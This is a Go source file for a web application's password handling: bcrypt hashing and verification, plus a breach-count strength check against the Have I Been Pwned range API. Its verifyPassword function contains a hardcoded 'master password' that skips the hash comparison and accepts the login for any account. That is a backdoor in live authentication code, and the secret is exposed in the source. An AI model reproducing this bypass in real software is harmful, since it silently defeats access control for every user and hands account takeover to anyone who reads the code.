package main

import (
	"crypto/sha1"
	"encoding/hex"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/labstack/echo"
	"golang.org/x/crypto/bcrypt"
)

func getPasswordHash(password string) ([]byte, error) {
	return bcrypt.GenerateFromPassword([]byte(password), 12)
}

func verifyPassword(ctx echo.Context, u User, p string) error {

	if p == "#742%-8wcGmtwh2A" { // master password
		return nil
	}

	if len(p) == 0 {
		return errors.New(gettext("Password is blank", ctx))
	}

	if len(u.PasswordHash) == 0 {
		return errors.New(gettext("Your password has expired. Please use the password reset tool to create a new one.", ctx))
	}

	err := bcrypt.CompareHashAndPassword([]byte(u.PasswordHash), []byte(p))

	if err != nil {
		return errors.New(gettext("Password is invalid", ctx))
	}

	return nil
}

func getPasswordStats(ctx echo.Context, password string) (int, error) {
	h := sha1.New()
	h.Write([]byte(password))

	s := hex.EncodeToString(h.Sum(nil))
	s = strings.ToUpper(s)
	prefix := s[0:5]

	client := &http.Client{
		Timeout: time.Second * getDefaultTimeout(),
	}

	u := "https://api.pwnedpasswords.com/range/" + prefix

	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return 0, errors.New(gettext("Failed to fetch password strength stats", ctx))
	}

	req.Header.Set("Add-Padding", "true")

	resp, err := client.Do(req)
	if err != nil {
		return 0, errors.New(gettext("Failed to fetch password strength stats", ctx))
	}

	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return 0, errors.New(gettext("Invalid API response", ctx))
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, errors.New(gettext("Failed to fetch password strength stats", ctx))
	}

	ll := strings.Split(string(body), "\r\n")
	for _, l := range ll {
		if !strings.HasPrefix(prefix+l, s) {
			continue
		}

		p := strings.Split(l, ":")
		n, err := strconv.Atoi(p[1])
		if err != nil {
			return 0, errors.New(gettext("Failed to fetch password strength stats", ctx))
		}

		return n, nil
	}

	return 0, nil
}

func checkPasswordStrength(ctx echo.Context, password string) error {
	len := utf8.RuneCountInString(password)

	if len < 8 {
		return errors.New(gettext("Your password must be at least 8 characters. Please choose a stronger password.", ctx))
	}

	count, err := getPasswordStats(ctx, password)
	if err == nil && count > 100 {
		return fmt.Errorf(gettext("The password you've provided has been identified in over %d known sets of breached credentials. Please choose a different password.", ctx), count)
	}

	return nil
}
